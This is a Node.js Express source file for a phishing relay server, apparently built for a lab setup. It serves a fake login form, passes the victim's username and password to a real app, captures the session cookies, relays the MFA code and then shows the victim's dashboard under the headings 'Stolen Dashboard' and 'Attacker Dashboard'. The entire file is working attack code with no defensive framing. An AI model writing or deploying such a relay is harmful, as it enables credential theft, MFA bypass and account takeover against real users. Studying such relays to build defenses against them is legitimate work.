const express = require('express');
const axios = require('axios');

const app = express();
const session = require('express-session');

app.use(express.urlencoded({ extended: true }));
app.use(
  session({
    secret: 'attacker-secret',
    resave: false,
    saveUninitialized: true,
  })
);

app.get('/', (req, res) => {

  res.send(`
    <h1>Fake Login</h1>

    <form method="POST" action="/login">

      <input
        name="username"
        placeholder="username"
      />

      <input
        type="password"
        name="password"
        placeholder="password"
      />

      <button type="submit">
        Login
      </button>

    </form>
  `);
});

app.post('/login', async (req, res) => {

  const {
    username,
    password,
  } = req.body;

  try {

    const response =
      await axios.post(
        'http://app:3000/login',
        new URLSearchParams({
          username,
          password,
        }),
        {
          headers: {
            'Content-Type':
              'application/x-www-form-urlencoded',
          },
          maxRedirects: 0,
          validateStatus: () => true,
        }
      );
    
    console.log(response.status);
    
    console.log(response.headers);
    
    const cookies =
      response.headers['set-cookie'];
    req.session.realAppCookies =
      cookies;
    
    console.log(cookies);

    const meResponse =
      await axios.get(
        'http://app:3000/mfa/setup',
        {
          headers: {
            Cookie: cookies.join(';'),
          },
          maxRedirects: 0,
          validateStatus: () => true,
        }
      );

    console.log(meResponse.status);
    
    res.send(`
      <h1>Enter MFA Code</h1>
    
      <form method="POST" action="/mfa">
    
        <input
          name="token"
          placeholder="123456"
        />
    
        <button type="submit">
          Verify
        </button>
    
      </form>
    `);

  } catch (err) {

    console.error(err);

    res.send('Relay failed');
  }
});

app.post('/mfa', async (req, res) => {

  const { token } = req.body;

  const cookies =
    req.session.realAppCookies;

  try {

    const response =
      await axios.post(
        'http://app:3000/mfa/verify',
        new URLSearchParams({
          token,
        }),
        {
          headers: {
            Cookie: cookies.join(';'),
            'Content-Type':
              'application/x-www-form-urlencoded',
          },
          maxRedirects: 0,
          validateStatus: () => true,
        }
      );

    console.log(response.status);

    const dashboardResponse =
      await axios.get(
        'http://app:3000/dashboard',
        {
          headers: {
            Cookie: cookies.join(';'),
          },
          maxRedirects: 0,
          validateStatus: () => true,
        }
      );
    
    console.log(
      dashboardResponse.status
    );
    
    res.send(`
      <h1>Stolen Dashboard</h1>
    
      ${dashboardResponse.data}
    `);

  } catch (err) {

    console.error(err);

    res.send('MFA relay failed');
  }
});

app.get(
  '/stolen-dashboard',
  async (req, res) => {

    const cookies =
      req.session.realAppCookies;

    if (!cookies) {

      return res.send(
        'No stolen session'
      );
    }

    try {

      const response =
        await axios.get(
          'http://app:3000/dashboard',
          {
            headers: {
              Cookie:
                cookies.join(';'),
            },
            maxRedirects: 0,
            validateStatus: () => true,
          }
        );

      res.send(`
        <h1>
          Attacker Dashboard
        </h1>

        ${response.data}
      `);

    } catch (err) {

      console.error(err);

      res.send(
        'Failed to access dashboard'
      );
    }
  }
);

app.listen(4000, () => {

  console.log(
    'Attacker app started on port 4000'
  );
});
